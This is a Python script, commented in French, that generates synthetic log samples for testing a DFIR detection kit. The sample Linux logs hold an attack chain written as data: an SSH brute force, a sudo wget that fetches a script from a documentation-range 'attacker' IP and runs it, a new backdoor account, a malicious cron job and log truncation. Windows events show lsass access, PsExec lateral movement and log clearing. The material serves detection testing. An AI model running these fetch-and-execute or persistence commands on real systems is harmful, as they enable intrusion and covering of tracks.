#!/usr/bin/env python3
"""gen_samples.py - genere les echantillons synthetiques de test du kit.

Produit dans tests/samples/ :
  - auth.log          : journal Linux synthetique (brute force puis succes)
  - syslog            : journal systeme synthetique (cron, purge)
  - security.jsonl    : evenements Windows synthetiques (format JSONL)
  - fake_evtx.jsonl   : alias Windows pour test de typage

Les donnees sont 100% synthetiques (IP de documentation RFC 5737, comptes fictifs).
"""
import json
from datetime import datetime, timedelta
from pathlib import Path

SAMPLES = Path(__file__).resolve().parent / "samples"

# IP de documentation (RFC 5737) - jamais routables
ATTAQUANT = "203.0.113.77"
VICTIME = "198.51.100.10"
ADMIN_SRC = "198.51.100.200"

BASE = datetime(2026, 8, 30, 2, 0, 0)


def ts(off):
    return (BASE + timedelta(seconds=off)).strftime("%b %d %H:%M:%S")


def gen_auth_log():
    lignes = []
    # Pattern C-L-01 : burst d'echecs puis succes (SF-L-001, SF-L-002)
    for i in range(14):
        lignes.append(
            f"{ts(i*20)} {VICTIME} sshd[4200+i]: Failed password for admin from {ATTAQUANT} port {40000+i} ssh2"
        )
    lignes.append(
        f"{ts(300)} {VICTIME} sshd[4215]: Accepted password for admin from {ATTAQUANT} port 40014 ssh2"
    )
    # Activite post-compromission (SF-L-010, SF-L-011)
    lignes.append(f"{ts(330)} {VICTIME} sudo:   admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://{ATTAQUANT}/st.sh -O /tmp/st.sh")
    lignes.append(f"{ts(335)} {VICTIME} sudo:   admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x /tmp/st.sh")
    lignes.append(f"{ts(340)} {VICTIME} sudo:   admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/st.sh")
    # Persistance (SF-L-021, SF-L-020)
    lignes.append(f"{ts(360)} {VICTIME} useradd[4230]: new user: name=svcbackup, UID=1002, GID=1002, home=/home/svcbackup, shell=/bin/bash")
    lignes.append(f"{ts(370)} {VICTIME} sudo:   admin : TTY=pts/0 ; PWD=/etc ; USER=root ; COMMAND=/usr/sbin/useradd svcbackup")
    # Session legitime de controle (bruit)
    lignes.append(f"{ts(600)} {VICTIME} sshd[4300]: Accepted publickey for ops from {ADMIN_SRC} port 51000 ssh2")
    (SAMPLES / "auth.log").write_text("\n".join(lignes) + "\n")


def gen_syslog():
    lignes = []
    # Cron malveillant (SF-L-020)
    lignes.append(f"{ts(380)} {VICTIME} CRON[4240]: (root) CMD (/tmp/st.sh)")
    lignes.append(f"{ts(400)} {VICTIME} systemd[1]: Started /etc/cron.d/svcbk -- Simple Backup Service.")
    # Purge de journaux (SF-L-030)
    lignes.append(f"{ts(500)} {VICTIME} bash[4301]: /var/log/auth.log truncated by root")
    (SAMPLES / "syslog").write_text("\n".join(lignes) + "\n")


def evtx_event(event_id, channel, off, **champs):
    e = {
        "EventTime": (BASE + timedelta(seconds=off)).isoformat(),
        "Channel": channel,
        "EventID": event_id,
        "Computer": "SRV-WEB01",
    }
    e.update(champs)
    return e


def gen_security_jsonl():
    evenements = [
        # C-W-01 : execution utilisateur -> temp -> persistance -> lsass -> lateral
        evtx_event(4688, "Security", 0, SubjectUserName="jdupont", NewProcessName="C:\\Users\\jdupont\\AppData\\Local\\Temp\\invoice.exe", CommandLine="invoice.exe /quiet"),
        evtx_event(1, "Microsoft-Windows-Sysmon/Operational", 5, Image="C:\\Users\\jdupont\\AppData\\Local\\Temp\\invoice.exe", CommandLine="invoice.exe /quiet", User="CORP\\jdupont"),
        evtx_event(7045, "System", 120, ServiceName="WinDefendUpd", ServiceFileName="C:\\Windows\\Temp\\svchosts.exe", StartType="auto start"),
        evtx_event(10, "Microsoft-Windows-Sysmon/Operational", 600, SourceImage="C:\\Windows\\Temp\\svchosts.exe", TargetImage="C:\\Windows\\system32\\lsass.exe", GrantedAccess="0x1010", User="NT AUTHORITY\\SYSTEM"),
        evtx_event(7045, "System", 900, ServiceName="PSEXESVC", ServiceFileName="PSEXESVC.exe", StartType="demand start"),
        evtx_event(4624, "Security", 910, LogonType=3, TargetUserName="svc_sql", IpAddress=ADMIN_SRC),
        # Journal efface (SF-W-040)
        evtx_event(1102, "Security", 1200, SubjectUserName="jdupont"),
    ]
    (SAMPLES / "security.jsonl").write_text("\n".join(json.dumps(e) for e in evenements) + "\n")


def gen_rules_yar():
    regle = """rule kit_test_marker {
    strings:
        $marker = "KIT-DFIR-TEST-MARKER"
    condition:
        $marker
}
"""
    (SAMPLES / "rules.yar").write_text(regle)
    (SAMPLES / "testfile.bin").write_bytes(b"BASIC BINARY PADDING\nKIT-DFIR-TEST-MARKER\n")


if __name__ == "__main__":
    SAMPLES.mkdir(parents=True, exist_ok=True)
    gen_auth_log()
    gen_syslog()
    gen_security_jsonl()
    gen_rules_yar()
    print(f"Echantillons generes dans {SAMPLES}")
    for f in sorted(SAMPLES.iterdir()):
        print(f"  - {f.name} ({f.stat().st_size} octets)")
